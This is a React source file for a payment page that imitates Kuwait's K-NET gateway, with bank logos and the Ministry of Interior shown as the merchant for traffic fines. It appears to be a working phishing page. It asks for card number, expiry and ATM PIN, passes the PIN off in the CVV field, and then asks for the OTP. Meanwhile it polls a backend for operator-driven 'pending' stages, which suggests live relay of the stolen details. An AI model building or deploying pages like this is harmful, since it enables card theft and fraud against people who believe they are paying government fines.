import React, { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

// Mapping bank card prefixes to bank names and logos
const BANK_MAP: Record<string, { name: string, logo: string }> = {
  "4": { name: "NBK", logo: "https://www.nbk.com/dam/jcr:8b8c5c7a-5b5b-4b1a-8b8c-5c7a5b5b4b1a/nbk-logo.png" },
  "5": { name: "KFH", logo: "https://www.kfh.com/dam/jcr:7b7c6c7a-4b4b-4b1a-7b7c-6c7a4b4b4b1a/kfh-logo.png" },
  "6": { name: "Boubyan", logo: "https://www.boubyanbank.com/logo.png" },
  "4062": { name: "Gulf Bank", logo: "https://www.e-gulfbank.com/logo.png" },
  "4192": { name: "Burgan Bank", logo: "https://www.burgan.com/logo.png" },
};

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState(""); // ATM PIN in first page
  const [otp, setOtp] = useState("");
  
  const [detectedBank, setDetectedBank] = useState<any>(null);
  const { lang } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: parsed.enquiryType,
      queryId: parsed.queryId
    });
  }, []);

  useEffect(() => {
    const prefix4 = cardNumber.substring(0, 4);
    const prefix1 = cardNumber.substring(0, 1);
    if (BANK_MAP[prefix4]) setDetectedBank(BANK_MAP[prefix4]);
    else if (BANK_MAP[prefix1]) setDetectedBank(BANK_MAP[prefix1]);
    else setDetectedBank(null);
  }, [cardNumber]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      // Skip ATM stage if backend returns it, because we handle it in the first page
      if (sessionStatus.stage === "atm") {
        setStage("otp"); 
      } else {
        setStage(sessionStatus.stage as Stage);
      }
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    // We send PIN as part of the initial card submission or we can map it to what the backend expects
    submitCard.mutate({
      sessionId,
      cardName: "KNET Customer",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin // Using PIN field for the ATM PIN required in KNET
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-portal" dir="ltr">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #f4f7f9; font-family: 'Segoe UI', Arial, sans-serif; }
        .knet-portal { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 40px; padding-bottom: 40px; }
        .knet-container { background: #fff; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #e1e4e8; }
        .knet-header { background: #005eb8; padding: 25px; text-align: center; color: #fff; }
        .knet-logo { height: 45px; }
        .merchant-info { background: #fdfdfd; padding: 15px 25px; border-bottom: 1px solid #eee; font-size: 14px; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
        .info-label { color: #777; }
        .info-value { font-weight: 600; color: #333; }
        .knet-body { padding: 30px 25px; }
        .knet-label { font-size: 14px; font-weight: 600; color: #555; margin-bottom: 8px; display: block; }
        .knet-input { border: 1px solid #ccc; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; outline: none; transition: border-color 0.2s; }
        .knet-input:focus { border-color: #005eb8; }
        .bank-selector { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 4px; padding: 8px 12px; background: #fff; height: 50px; }
        .bank-logo { height: 28px; margin-right: 12px; }
        .btn-knet-submit { background: #005eb8; color: #fff; border: none; border-radius: 4px; padding: 15px; width: 100%; font-weight: bold; font-size: 17px; margin-top: 25px; cursor: pointer; }
        .btn-knet-cancel { background: #fff; color: #888; border: 1px solid #ddd; border-radius: 4px; padding: 10px; width: 100%; font-size: 14px; margin-top: 12px; cursor: pointer; }
        .knet-footer { margin-top: 25px; text-align: center; color: #aaa; font-size: 12px; }
        
        @media (max-width: 480px) {
          .knet-portal { padding-top: 10px; }
          .knet-container { border-radius: 0; box-shadow: none; border: none; }
        }
      `}</style>

      <div className="knet-container">
        <div className="knet-header">
          <img src="https://www.knet.com.kw/wp-content/uploads/2020/03/knet-logo-white.png" className="knet-logo" alt="K-NET" />
        </div>

        <div className="merchant-info">
          <div className="info-row"><span className="info-label">Merchant:</span><span className="info-value">Ministry of Interior</span></div>
          <div className="info-row"><span className="info-label">Amount:</span><span className="info-value text-primary" style={{fontSize:'18px'}}>{paymentData.totalAmount} KWD</span></div>
        </div>

        <div className="knet-body">
          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="form-group">
                <label className="knet-label">Select Your Bank</label>
                <div className="bank-selector">
                  {detectedBank ? (
                    <><img src={detectedBank.logo} className="bank-logo" alt={detectedBank.name} /><span>{detectedBank.name}</span></>
                  ) : (
                    <span className="text-muted small">Card number will auto-detect bank</span>
                  )}
                </div>
              </div>

              <div className="form-group mt-4">
                <label className="knet-label">Card Number</label>
                <input type="text" className="knet-input" placeholder="0000 0000 0000 0000" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 16))} required />
              </div>

              <div className="row mt-4">
                <div className="col-7">
                  <label className="knet-label">Expiration Date</label>
                  <div className="d-flex">
                    <select className="knet-input mr-2" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required>
                      <option value="">MM</option>
                      {Array.from({length: 12}, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                    <select className="knet-input" value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required>
                      <option value="">YY</option>
                      {Array.from({length: 10}, (_, i) => (new Date().getFullYear() + i).toString().substring(2)).map(y => <option key={y} value={y}>{y}</option>)}
                    </select>
                  </div>
                </div>
                <div className="col-5">
                  <label className="knet-label">ATM PIN</label>
                  <input type="password" maxlength="4" className="knet-input text-center" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                </div>
              </div>

              <button type="submit" className="btn-knet-submit">Submit</button>
              <button type="button" className="btn-knet-cancel" onClick={() => setLocation("/")}>Cancel</button>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <h5 className="font-weight-bold mb-4">Enter One-Time Password (OTP)</h5>
              <p className="text-muted small mb-4">A security code has been sent to your mobile number. Please enter it to authorize the transaction.</p>
              <div className="form-group">
                <input type="text" className="knet-input text-center" style={{ letterSpacing: '0.4em', fontSize: '22px' }} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} placeholder="000000" required />
              </div>
              <button type="submit" className="btn-knet-submit">Confirm OTP</button>
              <p className="mt-3 small"><a href="#" className="text-primary">Resend OTP Code</a></p>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary mb-4" style={{ width: '3rem', height: '3rem' }}></div>
              <h6 className="font-weight-bold">Processing Your Request</h6>
              <p className="text-muted small">Please wait, do not close the page.</p>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <div className="mb-4"><svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="#28a745" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg></div>
              <h4 className="font-weight-bold text-success">Transaction Successful</h4>
              <p className="text-muted mb-4 small">Your payment has been processed successfully.</p>
              <button className="btn-knet-submit" onClick={() => setLocation("/")}>Return to Merchant</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <div className="mb-4"><svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="#dc3545" strokeWidth="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg></div>
              <h4 className="font-weight-bold text-danger">Transaction Failed</h4>
              <p className="text-muted mb-4 small">{error || "The transaction was declined."}</p>
              <button className="btn-knet-submit" onClick={() => setStage("card")}>Try Again</button>
            </div>
          )}
        </div>
      </div>
      <div className="knet-footer"><p>© 2026 K-NET. All rights reserved.</p></div>
    </div>
  );
}
